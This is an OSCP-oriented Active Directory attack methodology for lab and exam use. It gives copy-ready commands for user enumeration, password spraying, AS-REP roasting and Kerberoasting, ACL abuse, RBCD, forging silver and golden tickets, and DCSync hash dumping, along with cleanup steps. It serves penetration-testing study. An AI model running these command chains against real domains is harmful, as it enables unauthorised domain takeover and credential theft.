Active Directory methodology

The AD attack path from zero credentials to Domain Admin — unauth recon, BloodHound-driven ACL abuse, Kerberoasting, delegation, and domain dominance — ordered by what actually works in the labs.

Prime Rules

  1. Enumerate before you exploit. Every AD box has a specific weak-cred / ACL / delegation path — find it before running exploits.
  2. BloodHound is your map — collect early with any working cred, re-collect after every credential gain.
  3. Password reuse across every user, every service, every box — highest-ROI move in AD.
  4. Timing matters — Kerberos rejects tickets outside the 5-minute skew window. sudo ntpdate <DC_IP> before every ticket op.
  5. Cleanup is mandatory — every SPN plant, every group add, every RBCD delegation must be reverted for OpSec (and OSCP report quality).
  6. Responder poisoning is EXAM-BANNED — only analyse-only -A is EXAM-OK for LLMNR observation.

DC Identification Signature

Open port set that says "this is a DC":

  • 88 — Kerberos
  • 389 — LDAP
  • 636 — LDAPS
  • 464 — kpasswd
  • 593 — RPC-over-HTTP
  • 3268 / 3269 — GC / GC-SSL (present on DCs that host the Global Catalog role)
  • 445 — SMB (always)
  • 5985 — WinRM (usually)

The Distilled Methodology

Phase A — Unauthenticated Recon

# 1. Broad enum from zero:
enum4linux-ng -A <DC_IP>                                   # SAMR works even when LDAP anon denied — Resourced
nxc smb <DC_IP> -u '' -p '' --shares
nxc smb <DC_IP> -u '' -p '' --rid-brute                    # baseline
nxc smb <DC_IP> -u 'guest' -p '' --rid-brute               # guest fallback (Vault)

# 2. Anonymous LDAP:
ldapsearch -x -H ldap://<DC_IP> -b '' -s base namingContexts
ldapsearch -x -H ldap://<DC_IP> -b "DC=<DOMAIN>,DC=local" '(objectClass=user)' \
  sAMAccountName description info | grep -iE "sAMAccountName|description|info"

# 3. Kerberos: AS-REP roast without creds
impacket-GetNPUsers <DOMAIN>/<USER> -dc-ip <DC_IP> -no-pass -format hashcat
# -> hashcat -m 18200 <hash> <WORDLIST>

# 4. Password policy (need one cred usually):
nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol            # threshold determines safe spray

# 5. Kerbrute (pre-auth, no lockout risk):
username-anarchy --input-file names.txt > users.txt         # web-scraped names -> permutations
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid.txt

Phase B — First Credential -> BloodHound

# BloodHound-CE (v5+):
bloodhound-ce-python -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All --zip

# Classic BloodHound:
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All --zip

# From Windows:
SharpHound.exe -c All

Immediate BloodHound queries:

  • Find AS-REP Roastable Users -> set them roastable via GenericWrite if you have ACL
  • Find Kerberoastable Users -> impacket-GetUserSPNs
  • Shortest paths from Owned to Domain Admins
  • Mark every compromised account as Owned

Phase C — Credential Harvesting

# LAPS ExtendedRight?
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M laps            # Hutch
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASS>' \
  -b "DC=<DOMAIN>,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd sAMAccountName

# Description fields:
Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}

# gMSA managed passwords (need ReadGMSAPassword):
gMSADumper.py -u <USER> -p '<PASS>' -d <DOMAIN>

# Mailboxes (post-Linux-foothold on any DC-member Linux host):
cat /var/mail/*                                        # colleagues share creds by email

Kerberos Clock-Skew Fix (KRB_AP_ERR_SKEW)

Kerberos rejects tickets more than five minutes off the KDC's clock. When you pivot through a SOCKS proxy (proxychains), ntpdate from Kali won't help — you need to trick just the impacket call.

# Read the domain controller's current time (over SMB, works via proxychains too)
proxychains -q net time -S <DC_IP>
# Sun Oct 15 08:47:03 UTC 2023   <-- note this value

# Re-issue the impacket command with faketime pinned to the DC clock
faketime 'YYYY-MM-DD HH:MM:SS' proxychains -q impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>
faketime '2023-10-15 08:47:03'  proxychains -q impacket-GetNPUsers   -no-pass -dc-ip <DC_IP> <DOMAIN>/ -usersfile users.txt

If faketime isn't installed: sudo apt install faketime.

When to use: any impacket command that talks Kerberos (GetUserSPNs, GetNPUsers, getST, secretsdump -k, psexec -k) failing with skew errors. chrony / ntpdate on the whole Kali box also works but requires root and touches the host clock — faketime is per-command and doesn't.

Key Exam-Ready One-Liners

Enumeration (unauth -> cred)

enum4linux-ng -A <DC_IP>
nxc smb <DC_IP> -u '' -p '' --shares --rid-brute
nxc smb <DC_IP> -u guest -p '' --rid-brute

# AS-REP roast for all users at once
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# Kerbrute
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt Summer2024!
#   1 password x N users = 1 lockout tick per user (safer than N passwords x 1 user)

# BloodHound (needs one cred):
bloodhound-ce-python -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All --zip

# LAPS:
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M laps

Kerberoast (Need One Cred)

impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request -outputfile spn.hash
hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt

# From Windows (Rubeus):
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap

ACL Abuse Chain (BloodHound -> Path)

# ForceChangePassword:
net rpc password "<TARGET_USER>" 'Nagoya@Winter24!' -U "<DOMAIN>/<USER>%<PASS>" -S <DC_IP>

# GenericAll -> add self to group:
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>' add groupMember 'Server Admins' <USER>

# CLEANUP MANDATORY:
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>' remove groupMember 'Server Admins' <USER>

RBCD (Resource-Based Constrained Delegation)

sudo ntpdate <DC_IP>

# 1. Add attacker-controlled machine account
impacket-addcomputer <DOMAIN>/<USER> -hashes :<NT> -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip <DC_IP>

# 2. Write RBCD ACL — delegate FROM EVIL$ TO the target
impacket-rbcd <DOMAIN>/<USER> -hashes :<NT> -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write -dc-ip <DC_IP>

# 3. Request service ticket impersonating Administrator
impacket-getST <DOMAIN>/'EVIL$':'Passw0rd!' -spn cifs/<TARGET_FQDN> -impersonate Administrator -dc-ip <DC_IP>
export KRB5CCNAME=$PWD/Administrator@cifs_<TARGET_FQDN>@<DOMAIN>.ccache

# 4. Access target
impacket-psexec -k -no-pass <TARGET_FQDN>

# CLEANUP:
impacket-rbcd <DOMAIN>/<USER> -hashes :<NT> -delegate-to '<TARGET>$' -action flush -dc-ip <DC_IP>
impacket-addcomputer <DOMAIN>/<USER> -hashes :<NT> -computer-name 'EVIL$' -action del -dc-ip <DC_IP>

Silver Ticket (MSSQL Example — Nagoya)

sudo ntpdate <DC_IP>
impacket-ticketer -nthash <svc_mssql_NT> -domain-sid S-1-5-21-... -domain <DOMAIN> -spn MSSQL/<DC_FQDN> administrator
export KRB5CCNAME=$PWD/administrator.ccache

# SPN must resolve to the tunneled 1433 endpoint:
echo "127.0.0.1 <DC_FQDN>" | sudo tee -a /etc/hosts
impacket-mssqlclient -k <DC_FQDN>

Golden Ticket (Post-DA)

# On DC via lsadump / secretsdump:
impacket-secretsdump -just-dc-user krbtgt <DOMAIN>/Administrator@<DC_IP>

# Then forge:
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <DOMSID> -domain <DOMAIN> Administrator

DA — The Final Move

# DCSync via ExtendedRight on domain root:
impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:'<PASS>'@<DC_IP>
# -> NT hash of Administrator + krbtgt -> own the domain

Cross-Domain (Trust Attacks)

Extra-SID + child-krbtgt = golden ticket that traverses the trust.

OpSec + Cleanup (Mandatory for OSCP Report Quality)

Every step above requires a specific undo:

Action Undo
Added a SPN Set-DomainObject -Credential $creds -Identity victim -Clear serviceprincipalname
Added self to a group Remove-DomainGroupMember -Identity $group -Members $user
Reset a user's password Coordinate with client / note in report
RBCD write impacket-rbcd -action flush
Machine account added impacket-addcomputer -action del
Certificate enrolled Mark for revocation
Golden ticket forged Do not persist across engagements; note in report

Document every modification — the OSCP report must list every account touched and confirm cleanup.

EXAM Restrictions

BANNED:

  • Responder poisoning — active answering of LLMNR/NBT-NS/mDNS. Only analyse-only -A is EXAM-OK.
  • All spoofing — ARP / DNS / NBNS / LLMNR / mDNS.

RESTRICTED — one target only:

  • Metasploit exploit / auxiliary / post modules for anything except multi/handler.
  • Meterpreter payloads.
  • Prefer impacket + evil-winrm + nxc + BloodHound + Rubeus.

Every banned tool has a manual EXAM-OK path — see the individual technique notes.

EXAM-Day AD Checklist

From zero (no cred):

  • [ ] Full port scan on DC — confirm DC signature (88+389+636+445)
  • [ ] enum4linux-ng -A <DC_IP>
  • [ ] nxc smb -u '' -p '' --rid-brute and -u guest -p '' fallback
  • [ ] Anon LDAP -b '' namingContexts
  • [ ] AS-REP roast with -no-pass (from any username list)
  • [ ] kerbrute userenum after any username list built (username-anarchy on scraped names)

With one cred:

  • [ ] BloodHound collection (bloodhound-ce-python -c All)
  • [ ] Password policy check (--pass-pol)
  • [ ] LAPS check (nxc ldap -M laps)
  • [ ] --continue-on-success on any spray (netexec --gfail-limit / --ufail-limit)
  • [ ] Kerberoast if any SPN
  • [ ] Description/info field grep on all users
  • [ ] Mark cred as Owned in BloodHound; recompute paths

Per BloodHound edge:

  • [ ] Read edge details in BloodHound before executing
  • [ ] Note cleanup command BEFORE executing
  • [ ] Execute
  • [ ] Cleanup (add reminder to notes if not immediate)
  • [ ] Recollect BloodHound after any cred/ACL change

Under exam time pressure:

  • [ ] Timebox 30 min per attempted path
  • [ ] Don't try to Kerberoast a hash uncrackable in rockyou — move on
  • [ ] Password reuse is the highest-ROI move; try it constantly
  • [ ] Metasploit modules = one target only
  • [ ] Responder = analyse only
